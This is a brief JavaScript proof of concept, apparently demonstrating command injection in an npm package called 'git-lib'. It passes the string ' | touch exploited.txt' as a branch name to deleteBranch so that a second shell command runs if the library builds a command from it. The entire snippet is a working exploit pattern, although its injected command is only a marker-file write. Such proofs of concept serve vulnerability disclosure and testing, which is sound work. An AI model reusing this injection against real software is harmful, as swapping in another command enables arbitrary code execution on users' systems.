const pkg = require('git-lib');

const payload = " | touch exploited.txt";

console.log(pkg);

const branch = payload;

pkg.deleteBranch(branch);